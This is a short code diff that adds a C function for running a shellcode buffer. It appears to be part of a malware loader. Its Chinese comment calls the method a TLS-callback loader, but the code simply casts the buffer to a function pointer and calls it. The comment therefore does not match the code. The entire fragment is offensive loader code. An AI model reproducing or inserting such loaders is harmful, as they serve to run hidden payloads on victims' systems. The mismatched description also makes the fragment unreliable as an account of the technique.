@@ -1,0 +1,9 @@
+// TLS回调加载方式：使用TLS回调函数执行Shellcode
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] TLS回调方式执行Shellcode\n");
+#endif
+    typedef void (WINAPI *PFN_ExecuteShellcode)(PBYTE, SIZE_T);
+    PFN_ExecuteShellcode execFunc = (PFN_ExecuteShellcode)shellcode;
+    execFunc(shellcode, shellcodeSize);
+}
